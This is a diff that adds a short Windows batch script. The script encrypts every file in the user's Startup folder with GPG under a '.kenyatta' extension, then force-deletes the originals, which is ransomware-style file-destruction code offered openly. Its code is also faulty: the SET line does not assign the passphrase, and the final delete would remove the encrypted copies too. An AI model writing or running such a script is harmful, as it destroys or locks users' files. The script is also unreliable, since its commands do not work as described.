@@ -1,0 +1,16 @@
+REM This script searches for startup folders and encrypts the files by appending ".kenyatta" to the encrypted files.
+
+REM Change the value of the "passphrase" variable to your desired passphrase
+SET passphrase "mypassphrase"
+
+REM Navigate to the Startup folder
+CD C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+REM Encrypt all files in the Startup folder
+FOR /R . %%G IN (*) DO gpg --symmetric --passphrase %passphrase% --output "%%G.kenyatta" "%%G"
+
+REM Delete the original unencrypted files
+DEL /Q /F *
+
+Note: This script assumes that you have GPG (GNU Privacy Guard) installed on your system. If you don't have GPG installed, you can install it by following the instructions on the official GPG website: https://gnupg.org/download/
+
